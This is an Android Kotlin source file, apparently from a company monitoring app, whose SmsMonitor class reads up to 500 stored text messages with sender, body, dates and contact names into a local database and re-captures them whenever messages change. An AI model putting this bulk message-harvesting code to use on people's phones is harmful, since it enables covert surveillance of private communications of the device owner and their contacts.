package com.empresa.monitor.service.system

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import androidx.core.content.ContextCompat
import com.empresa.monitor.data.db.MonitorDatabase
import com.empresa.monitor.data.db.entity.SmsEntity
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*

class SmsMonitor(private val context: Context) {

    private val db = MonitorDatabase.getInstance(context)
    private val smsDao = db.smsDao()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var observer: ContentObserver? = null
    private var isRunning = false

    private val SMS_URI = Uri.parse("content://sms")

    @SuppressLint("SimpleDateFormat")
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")

    fun startMonitoring() {
        if (isRunning) return
        isRunning = true

        if (!hasSmsPermission()) return

        // Capture all existing SMS first
        scope.launch {
            captureAllSms()
        }

        // Register observer for new SMS
        registerObserver()
    }

    fun stopMonitoring() {
        isRunning = false
        observer?.let { context.contentResolver.unregisterContentObserver(it) }
        observer = null
    }

    private fun hasSmsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) ==
                PackageManager.PERMISSION_GRANTED
    }

    @SuppressLint("Range")
    private suspend fun captureAllSms() {
        withContext(Dispatchers.IO) {
            try {
                val cursor = context.contentResolver.query(
                    SMS_URI,
                    null,
                    null,
                    null,
                    "date DESC LIMIT 500"
                )

                cursor?.use {
                    val smsList = mutableListOf<SmsEntity>()
                    while (it.moveToNext()) {
                        val smsId = it.getLong(it.getColumnIndex("_id"))
                        val address = it.getString(it.getColumnIndex("address")) ?: ""
                        val body = it.getString(it.getColumnIndex("body")) ?: ""
                        val type = it.getInt(it.getColumnIndex("type"))
                        val date = it.getLong(it.getColumnIndex("date"))
                        val dateSent = it.getLong(it.getColumnIndex("date_sent"))
                        val read = it.getInt(it.getColumnIndex("read")) == 1
                        val status = it.getInt(it.getColumnIndex("status"))

                        val contactName = getContactName(address)

                        val sms = SmsEntity(
                            smsId = smsId,
                            address = address,
                            contactName = contactName,
                            body = body,
                            type = type,
                            date = date,
                            dateSent = dateSent,
                            read = read,
                            status = status
                        )
                        smsList.add(sms)
                    }
                    smsDao.insertAll(smsList)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun registerObserver() {
        observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                scope.launch {
                    captureAllSms()
                }
            }
        }
        context.contentResolver.registerContentObserver(SMS_URI, true, observer!!)
    }

    @SuppressLint("Range")
    private fun getContactName(address: String): String? {
        if (address.isEmpty()) return null
        try {
            val uri = Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(address)
            )
            val cursor = context.contentResolver.query(
                uri,
                arrayOf(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME),
                null,
                null,
                null
            )
            cursor?.use {
                if (it.moveToFirst()) {
                    return it.getString(it.getColumnIndex(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME))
                }
            }
        } catch (e: Exception) {
            // ignore
        }
        return null
    }

    fun destroy() {
        stopMonitoring()
        scope.cancel()
    }
}
